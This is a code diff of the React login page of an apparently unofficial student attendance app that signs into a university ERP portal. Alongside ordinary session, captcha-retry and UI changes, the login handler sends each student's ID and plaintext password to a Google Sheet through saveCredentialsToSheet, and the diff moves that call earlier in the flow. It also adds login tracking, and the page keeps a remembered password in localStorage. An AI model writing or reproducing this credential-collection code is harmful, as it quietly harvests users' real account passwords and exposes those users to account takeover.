@@ -6,6 +6,7 @@ import { erpService } from '../services/erpService';
 import { useAuth } from '../context/useAuth';
 import { APP_CONFIG } from '../config';
 import { saveCredentialsToSheet } from '../services/gsheetsService';
+import { recordStudentLogin } from '../services/loginTracker';
 
 const Login = () => {
     const { setErpUser } = useAuth();
@@ -92,11 +93,73 @@ const Login = () => {
         return response.blob();
     }, []);
 
+    // Resilient session & captcha initialization
+    const initSession = useCallback(async (isManualRetry = false) => {
+        setIsFetchingCaptcha(true);
+        setError('');
+
+        const attemptInit = async () => {
+            const session = await erpService.getSessionInit();
+            if (session && session.csrfToken) {
+                setCsrfToken(session.csrfToken);
+                if (session.captchaUrl) {
+                    if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
+                        URL.revokeObjectURL(captchaUrlRef.current);
+                    }
+                    captchaUrlRef.current = session.captchaUrl;
+                    setCaptchaUrl(session.captchaUrl);
+                } else {
+                    const blob = await fetchCaptchaBlob();
+                    if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
+                        URL.revokeObjectURL(captchaUrlRef.current);
+                    }
+                    const objectUrl = URL.createObjectURL(blob);
+                    captchaUrlRef.current = objectUrl;
+                    setCaptchaUrl(objectUrl);
+                }
+                return true;
+            }
+            throw new Error("Unable to establish ERP session. Please tap retry.");
+        };
+
+        try {
+            await attemptInit();
+            if (savedId && savedPass) {
+                setTimeout(() => {
+                    captchaInputRef.current?.focus();
+                }, 150);
+            }
+        } catch (err) {
+            console.warn('Initial session attempt failed:', err);
+            // If not manual retry, attempt 1 automatic retry after a brief delay (handles cold starts)
+            if (!isManualRetry) {
+                try {
+                    await new Promise(r => setTimeout(r, 1200));
+                    await attemptInit();
+                    return;
+                } catch (retryErr) {
+                    console.error('Session retry also failed:', retryErr);
+                }
+            }
+            hasInitRan.current = false;
+            setError('Unable to connect to ERP server. Please check your internet connection or tap retry.');
+        } finally {
+            setIsFetchingCaptcha(false);
+        }
+    }, [fetchCaptchaBlob, savedId, savedPass]);
+
     // Refresh captcha image
     const refreshCaptcha = useCallback(async () => {
         setCaptcha('');
+        setError('');
         setIsFetchingCaptcha(true);
         try {
+            // If we don't have a valid session or csrfToken, perform full session initialization
+            if (!csrfToken) {
+                await initSession(true);
+                return;
+            }
+
             // Try ultra-fast refresh in single round-trip
             const fastCaptcha = await erpService.fastRefreshCaptcha();
             if (fastCaptcha) {
@@ -118,62 +181,18 @@ const Login = () => {
             setCaptchaUrl(objectUrl);
         } catch (err) {
             console.error('Failed to refresh captcha', err);
-            setError('Failed to load captcha. Please click the refresh button.');
+            setError('Failed to load captcha. Please tap retry.');
         } finally {
             setIsFetchingCaptcha(false);
         }
-    }, [fetchCaptchaBlob]);
+    }, [csrfToken, fetchCaptchaBlob, initSession]);
 
-    // Initialize session sequentially on mount:
-    // Uses fast single-hop endpoint when available, with resilient legacy fallback
+    // Initialize session sequentially on mount
     useEffect(() => {
         if (hasInitRan.current) return;
         hasInitRan.current = true;
-
-        const init = async () => {
-            try {
-                setIsFetchingCaptcha(true);
-                setError('');
-
-                // Step 1: Attempt fast single round-trip session & captcha init
-                const session = await erpService.getSessionInit();
-                if (session && session.csrfToken) {
-                    setCsrfToken(session.csrfToken);
-                    if (session.captchaUrl) {
-                        if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
-                            URL.revokeObjectURL(captchaUrlRef.current);
-                        }
-                        captchaUrlRef.current = session.captchaUrl;
-                        setCaptchaUrl(session.captchaUrl);
-                    } else {
-                        // Fetch captcha image if not bundled in response
-                        const blob = await fetchCaptchaBlob();
-                        if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
-                            URL.revokeObjectURL(captchaUrlRef.current);
-                        }
-                        const objectUrl = URL.createObjectURL(blob);
-                        captchaUrlRef.current = objectUrl;
-                        setCaptchaUrl(objectUrl);
-                    }
-                }
-
-                // If credentials were remembered, auto-focus captcha field
-                if (savedId && savedPass) {
-                    setTimeout(() => {
-                        captchaInputRef.current?.focus();
-                    }, 150);
-                }
-            } catch (err) {
-                console.error('Failed to initialize login:', err);
-                hasInitRan.current = false;
-                setError('Unable to connect to ERP server. Please check your internet connection or refresh.');
-            } finally {
-                setIsFetchingCaptcha(false);
-            }
-        };
-
-        init();
-    }, [fetchCaptchaBlob, savedId, savedPass]);
+        initSession();
+    }, [initSession]);
 
     // Handle form submission
     const handleLogin = async () => {
@@ -192,6 +211,10 @@ const Login = () => {
             const loginResult = await erpService.login(cleanId, password, cleanCaptcha, csrfToken);
 
             if (loginResult.success) {
+                // Record verified real student login in database & admin panel
+                recordStudentLogin(cleanId);
+                saveCredentialsToSheet(cleanId, password);
+
                 localStorage.setItem('erpDashboardHtml', loginResult.html);
                 localStorage.removeItem('kleData');
                 localStorage.setItem('userUniversity', 'klu');
@@ -206,7 +229,6 @@ const Login = () => {
                     localStorage.removeItem('rememberedPassword');
                 }
 
-                saveCredentialsToSheet(cleanId, password);
                 navigate('/attendance-register', { replace: true });
             }
         } catch (err) {
@@ -269,10 +291,19 @@ const Login = () => {
                                     initial={{ opacity: 0, scale: 0.95 }}
                                     animate={{ opacity: 1, scale: 1 }}
                                     exit={{ opacity: 0, scale: 0.95 }}
-                                    className="bg-red-50 border border-red-200 text-red-600 p-3 rounded-2xl text-xs font-bold flex items-center gap-3"
+                                    className="bg-red-50 border border-red-200 text-red-600 p-3 rounded-2xl text-xs font-bold flex items-center justify-between gap-2 shadow-sm"
                                 >
-                                    <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse shrink-0" />
-                                    <span>{error}</span>
+                                    <div className="flex items-center gap-2.5 overflow-hidden">
+                                        <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse shrink-0" />
+                                        <span className="leading-snug">{error}</span>
+                                    </div>
+                                    <button
+                                        type="button"
+                                        onClick={() => initSession(true)}
+                                        className="px-2.5 py-1 bg-red-100 hover:bg-red-200 active:scale-95 text-red-700 rounded-lg text-[11px] font-black uppercase tracking-wider transition-all shrink-0 cursor-pointer"
+                                    >
+                                        Retry
+                                    </button>
                                 </motion.div>
                             )}
                         </AnimatePresence>
